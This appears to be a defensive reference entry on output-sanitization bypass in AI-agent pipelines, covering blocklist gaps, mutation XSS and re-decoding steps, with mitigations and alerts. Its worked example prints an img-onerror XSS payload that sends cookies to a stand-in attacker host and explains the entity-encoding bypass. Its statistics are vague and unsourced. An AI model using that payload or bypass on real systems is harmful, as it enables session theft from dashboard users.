# Output Sanitization Bypass

## Issue
A pipeline runs agent-generated output through a sanitization step — a blocklist filter, an HTML-stripping function, a pattern-based scrubber — before it reaches a downstream consumer, and the sanitizer genuinely runs and genuinely modifies output that matches its rules. The gap is that the sanitizer's rules cover a specific, enumerable set of dangerous patterns rather than the full space of ways the same underlying danger can be represented: an encoded or obfuscated variant of a blocked pattern passes through untouched because it doesn't match the literal pattern the sanitizer looks for, or content that was safe at the moment it was sanitized becomes dangerous again after a later transformation step (minification, template re-interpolation, client-side re-parsing) that the sanitizer never accounted for. This is distinct from having no sanitization at all — the defense exists, runs, and has a real but incomplete coverage boundary that a sufficiently different-looking payload slips past.

**Frequency**: Occasional

**Symptoms**
- Content that is functionally equivalent to something the sanitizer is designed to block reaches the downstream consumer unmodified, because it used an encoding, obfuscation, or representation the sanitizer's rules don't cover
- A payload that the sanitizer correctly neutralizes in isolation becomes dangerous again after a subsequent processing step (e.g. a downstream template engine re-decodes an HTML entity the sanitizer left in place, reconstituting a stripped tag)
- Sanitizer test suites pass consistently against the known-bad examples they were written for, but a newly-discovered bypass technique (a different encoding, a different tag/attribute combination, a case or whitespace variant) reveals the same class of danger was never actually closed, only the specific instance
- The sanitizer runs at one point in the pipeline (e.g. immediately after generation) but a later step reintroduces or reconstructs the unsafe pattern from sanitized components, and no re-check happens after that later step
- Security review of the sanitizer's rule set finds it is a blocklist of specific known-bad patterns rather than an allowlist of known-safe output, meaning any pattern not anticipated at write time is permitted by default

## Root Cause
Blocklist-style sanitization enumerates specific dangerous patterns to strip or reject, but the space of representations that decode to the same dangerous meaning is effectively unbounded — alternate encodings, case variation, whitespace/comment insertion, nested or double-encoding, and mutation-based tricks (content that is inert as written but becomes active only after a downstream parser's own normalization step, a class of bypass sometimes called mutation XSS) all produce a final rendered/executed result equivalent to the blocked pattern without matching its literal form. Because the sanitizer typically runs once, at a fixed point in the pipeline, it has no visibility into how the content will be further transformed by later processing steps before it actually reaches its final rendering or execution context — so a sanitizer that correctly neutralizes a payload as written can be defeated by a downstream step it was never designed to anticipate, not by any flaw in the specific check it does perform.

## Example
```
A support-ticket agent generates a response that includes a snippet of
the customer's original message for context, rendered into an internal
dashboard as HTML. A sanitization step strips known dangerous tags
(<script>, <img onerror=...>, etc.) from any user-supplied content
before it's embedded in the agent's response.

A customer's original message (accidentally or as a probe) contains:

  <img src=x onerror="fetch('https://attacker.example/steal?c='+
  document.cookie)">

The sanitizer's pattern match correctly strips this literal <img ...>
tag. However, the sanitizer runs before the agent's own response
template performs a second-pass HTML-entity decode step (added later,
by a different engineer, to correctly render legitimately-encoded
customer content like "&amp;" back to "&") - a decode step the
sanitizer's author didn't know about and the sanitizer's design never
accounted for running after it.

A follow-up variant of the same payload, submitted HTML-entity-encoded
(&lt;img src=x onerror=...&gt;), passes the sanitizer's tag-pattern
check untouched, since it doesn't literally contain an "<img" tag as
written - the entity encoding hides it from the pattern match. The
downstream decode step then reconstitutes the encoded text back into a
live <img> tag with its onerror handler intact, and it executes when a
support agent views the ticket in the dashboard, exfiltrating that
agent's session cookie.
```

## Statistics
| Finding | Context |
|---|---|
| Blocklist-based output sanitizers are disproportionately vulnerable to bypass via encoding or representation variants not present in the original rule set, compared to allowlist-based approaches | Typical pattern observed in security reviews comparing blocklist vs. allowlist sanitization strategies |
| A meaningful share of sanitization-bypass incidents involve a downstream transformation step (decoding, minification, template re-interpolation) applied after the sanitizer ran, rather than a flaw in the sanitizer's own pattern matching | Estimated from postmortems of output-sanitization bypass incidents |
| Re-running sanitization (or validating the final rendered form) immediately before the actual render/execution context, rather than only once earlier in the pipeline, closes a substantial share of these bypasses | Reported range across teams that added a final-stage sanitization check |

## Mitigations
1. **Prefer allowlist over blocklist sanitization**: Define sanitization rules in terms of what is explicitly permitted (a fixed set of safe tags/attributes, a fixed character set) rather than what is blocked, so an unanticipated encoding or representation defaults to being stripped rather than defaulting to being permitted.
2. **Sanitize immediately before the final render/execution context, not only once earlier in the pipeline**: Apply (or re-apply) sanitization as the last step before content reaches its actual rendering or execution point, so any transformation steps between generation and rendering can't reintroduce a pattern the sanitizer already neutralized upstream.
3. **Use a well-maintained sanitization library, not a hand-written pattern list**: Rely on a sanitization library that is actively maintained against newly-discovered bypass techniques (including encoding tricks and mutation-based bypasses) rather than a custom regex/blocklist that only covers the specific payloads its author happened to think of.
4. **Treat every downstream transformation as a potential re-introduction point**: When adding a new processing step after sanitization (decoding, templating, minification), explicitly evaluate whether it could reconstitute a previously-neutralized pattern, and re-sanitize after that step if so.
5. **Fuzz the sanitizer with known bypass technique classes, not just known-bad examples**: Test the sanitizer against categories of bypass techniques (alternate encodings, case variation, mutation XSS patterns) rather than only the literal payloads it was originally written to catch, treating sanitizer coverage as an evolving target rather than a fixed pass/fail suite.

## Production Signals
### Key Metrics
| Metric | Description | Alert Threshold |
|---|---|---|
| post_sanitization_pattern_match_rate | Rate at which content flagged as dangerous by a secondary/independent check still appears after passing the primary sanitizer | Alert on any nonzero rate |
| sanitizer_bypass_technique_coverage | Share of known bypass technique classes (encoding variants, mutation patterns) the sanitizer is tested and confirmed to block | Alert if coverage regresses after a sanitizer or dependency update |
| downstream_transform_after_sanitization_count | Count of processing steps that run on content after it has passed sanitization, before final render/execution | Track as a leading indicator; alert when a new one is added without a corresponding re-sanitization review |

### Alerts
| Alert | Condition | Severity | Response |
|---|---|---|---|
| Sanitization bypass confirmed in production | A dangerous pattern is confirmed to have reached final render/execution despite sanitization | Critical | Patch the specific bypass, audit for the same technique elsewhere, add a final-stage sanitization check |
| New downstream transform added without re-sanitization review | A new post-sanitization processing step is deployed without evaluation against reintroduction risk | Medium | Require security review of the new step before it processes previously-sanitized content in production |

## Related Patterns
- [Input Validation Bypass](./input-validation-bypass.md) - the input-side mirror of this pattern: an encoding or representation variant slips past a check because the check matches only the canonical form, applied at input time rather than output time
- [Output Injection Vulnerability](./output-injection-vulnerability.md) - injection describes unescaped interpolation with no sanitization attempted at all; this pattern describes sanitization that is attempted but has an incomplete coverage boundary
- [Insecure Output Handling](../../../../security/goals/security-autonomy/failures/insecure-output-handling.md) - covers the broader case of a downstream system executing unsanitized LLM output; this pattern is the narrower case where sanitization exists but is bypassable
